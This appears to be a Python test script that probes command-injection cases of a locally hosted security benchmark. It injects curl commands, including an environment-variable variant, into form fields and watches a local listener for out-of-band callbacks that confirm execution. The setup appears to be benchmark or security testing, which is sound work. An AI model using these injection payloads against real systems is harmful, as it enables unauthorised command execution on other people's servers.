#!/usr/bin/env python3
"""CM-2 pre-patch LIVE probe round 2: the 'echo-family' 6 are direct-exec sinks
(unix cmd=\"\"), re-probed with NC-TWIN-DIRECT; also locate 02344's chunk."""
import http.server, threading, urllib.request, urllib.parse, time

HITS = []
class OAST(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        HITS.append(self.path)
        try: self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
        except Exception: pass

srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), OAST)
BASE = f"http://127.0.0.1:{srv.server_address[1]}"
threading.Thread(target=srv.serve_forever, daemon=True).start()

def probe(url, name, value):
    body = urllib.parse.urlencode({name: value})
    req = urllib.request.Request(url, data=body.encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST")
    t0 = HITS[:]
    try:
        r = urllib.request.urlopen(req, timeout=10); code, txt = r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        code, txt = e.code, e.read().decode("utf-8","replace")
    time.sleep(0.4)
    return code, [h for h in HITS if h not in t0], txt

# 1. chunk discovery for the remaining tests
tests = ["BenchmarkTest00567","BenchmarkTest00575","BenchmarkTest00576","BenchmarkTest01446",
         "BenchmarkTest02333","BenchmarkTest02334","BenchmarkTest02342","BenchmarkTest02343","BenchmarkTest02344"]
chunk = {}
for t in tests:
    for c in ("cmdi-00","cmdi-01","cmdi-02","cmdi-03"):
        code,_ ,_ = probe(f"http://127.0.0.1:8080/benchmark/{c}/{t}", "x", "1")
        if code != 404:
            chunk[t] = c; break
print("CHUNKS:", chunk)

# 2. NC-TWIN-DIRECT on the direct-exec family + 02344 twin-env retry
PLAN = [
    ("BenchmarkTest00567","sentinel-n/a"),  # placeholder replaced below
]
results = []
for t in tests:
    c = chunk.get(t)
    if not c: results.append((t, "NO CHUNK", None)); continue
    code, hits, txt = probe(f"http://127.0.0.1:8080/benchmark/{c}/{t}",
                             f"curl -s {BASE}/oob-{t[-4:]}", t)
    results.append((t, f"HTTP {code} hits={hits or 'NONE'}", None))
    if not hits:  # twin-env retry for envp-shaped (e.g. 02344)
        code2, hits2, _ = probe(f"http://127.0.0.1:8080/benchmark/{c}/{t}",
                                 f"FOO=curl -s {BASE}/oob-e{t[-4:]} ;", t)
        results.append((t, f"twin-env retry HTTP {code2} hits={hits2 or 'NONE'}", None))
for r in results: print(*r[:2])
print("ALL HITS:", HITS)
srv.shutdown()
